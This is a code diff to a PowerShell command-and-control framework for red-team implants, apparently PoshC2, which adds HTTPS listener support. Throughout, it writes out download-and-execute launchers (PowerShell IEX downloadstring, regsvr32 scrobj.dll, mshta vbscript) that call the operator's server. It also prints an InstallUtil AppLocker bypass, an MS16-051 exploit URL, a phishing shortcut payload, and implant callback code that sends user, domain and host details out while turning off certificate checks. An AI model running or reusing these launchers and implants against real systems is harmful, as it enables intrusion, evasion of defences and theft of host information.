@@ -670,7 +670,7 @@ import java.io.*;
 public class JavaPS extends Applet {
 public void init() {
 Process f;
-//http://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
+//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
 String arch = System.getenv("PROCESSOR_ARCHITECTURE");
 String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
 String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
@@ -716,7 +716,7 @@ $Jarpath = "$JDKPath" + "\bin\jar.exe"
 # host this HTML and SignedJarPS.jar on a web server.
 $HTMLCode = @'
 <div> 
-<object type="text/html" data="http://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
+<object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
 </object></div>
 <applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
 '@
@@ -754,13 +754,13 @@ if ($args[0])
     Write-Host "To quickly get setup for internal pentesting, run:"
     write-host $shortcut `n -ForegroundColor green
     Write-Host "For a more stealthy approach internally, use SubTee's Regsvr32:"
-    write-host "regsvr32 /s /n /u /i:http://$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "http://$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
 
     #launch a new powershell session with the implant handler running
@@ -807,31 +807,55 @@ else
         $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
     }
 
+    $prompt = Read-Host -Prompt "[2] Do you want to use HTTPS? [No]"
+    if ($prompt -eq "Yes") {
+    $ipv4address = "https://"+$ipv4address
+    Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
+    https://www.microsoft.com/en-us/download/details.aspx?id=17275
+    selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+    or 
+    
+    Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { $_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
+        $defaultserverport = 443
+    } else {
+    $ipv4address = "http://"+$ipv4address
+        $defaultserverport = 80
+    }
+    
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
-    $prompt = Read-Host -Prompt "[2] Enter a new folder name for this project [$($global:newdir)]"
+    $prompt = Read-Host -Prompt "[3] Enter a new folder name for this project [$($global:newdir)]"
     $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
     $global:newdir = 'C:\Temp\'+$tempdir
 
     $defbeacontime = 5
-    $prompt = Read-Host -Prompt "[3] Enter the default becaon time in seconds of the Posh C2 server (10% jitter is always applied) [$($defbeacontime)]"
+    $prompt = Read-Host -Prompt "[4] Enter the default becaon time in seconds of the Posh C2 server (10% jitter is always applied) [$($defbeacontime)]"
     $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
 
     $killdatedefault = (get-date).AddDays(14)
     $killdatedefault = (get-date -date $killdatedefault -Format "dd/MMM/yyyy")
-    $prompt = Read-Host -Prompt "[4] Enter the auto Kill Date of the implants in this format dd/MMM/yyyy [$($killdatedefault)]"
+    $prompt = Read-Host -Prompt "[5] Enter the auto Kill Date of the implants in this format dd/MMM/yyyy [$($killdatedefault)]"
     $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
     $killdatefm = Get-Date -Date $killdate -Format "dd/MMM/yyyy"
 
-    $defaultserverport = 80
-    $prompt = Read-Host -Prompt "[5] Enter the HTTP port you want to use, 80 is highly preferable for proxying [$($defaultserverport)]"
+    $prompt = Read-Host -Prompt "[6] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
     $serverport = ($defaultserverport,$prompt)[[bool]$prompt]
 
     $enablesound = "Yes"
-    $prompt = Read-Host -Prompt "[6] Do you want to enable sound? [$($enablesound)]"
+    $prompt = Read-Host -Prompt "[7] Do you want to enable sound? [$($enablesound)]"
     $enablesound = ($enablesound,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
-    $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
     $httpresponse = '
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -935,17 +959,18 @@ else
     Write-Host "To quickly get setup for internal pentesting, run:"
     write-host $shortcut `n -ForegroundColor green
     Write-Host "For a more stealthy approach, use SubTee's Regsvr32 or Mshta:"
-    write-host "regsvr32 /s /n /u /i:http://$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:http://$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "http://$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     # call back command
-    $command = 'function Get-Webclient ($Cookie) {
+    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+function Get-Webclient ($Cookie) {
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
@@ -956,7 +981,7 @@ function primer {
 if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
 $p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
+$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
 $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
 $pm } 
 $pm = primer
@@ -1008,8 +1033,8 @@ primer | iex }'
     $Shortcut.Save()
 
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
-    $DestinationPath = "$global:newdir\payloads\PhisingAttack-Link.lnk"
+    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
     $Shortcut.TargetPath = $SourceExe
@@ -1043,7 +1068,12 @@ while ($count -lt 5) {
 
 # C2 server component
 $listener = New-Object -TypeName System.Net.HttpListener 
-$listener.Prefixes.Add("http://+:$serverport/") 
+
+if ($ipv4address.Contains("https")) {
+    $listener.Prefixes.Add("https://+:$serverport/") 
+} else {
+    $listener.Prefixes.Add("http://+:$serverport/") 
+}
 $readhost = 'PS >'
 $listener.Start()
 
@@ -1259,6 +1289,7 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     $output
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $RandomURI="'+$randomuri+'"
 $Server = "$server/'+$randomuri+'"
 $ServerClean = "$server/"
@@ -1499,8 +1530,9 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     $output
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
-$Server = "http://'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
-$ServerClean = "http://'+$ipv4address+":"+$serverport+'"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
+$ServerClean = "'+$ipv4address+":"+$serverport+'"
 while($true)
 {
     $date = (Get-Date -Format "dd/MMM/yyyy")
